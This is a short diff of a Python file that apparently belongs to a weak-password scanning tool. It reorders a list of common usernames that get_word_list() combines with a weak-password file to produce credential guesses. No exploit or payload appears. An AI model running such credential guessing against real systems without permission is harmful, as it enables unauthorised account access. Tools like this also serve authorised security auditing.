@@ -65,7 +65,7 @@ result_queue = queue.Queue()
 
 
 def get_word_list():
-    common_username = ('ftp', 'test', 'root', 'guest', 'admin', 'daemon', 'user')
+    common_username = ('admin', 'ftp', 'test', 'root', 'guest', 'daemon', 'user')
     with open(paths.WEAK_PASS) as f:
         return itertools.product(common_username, f)
 
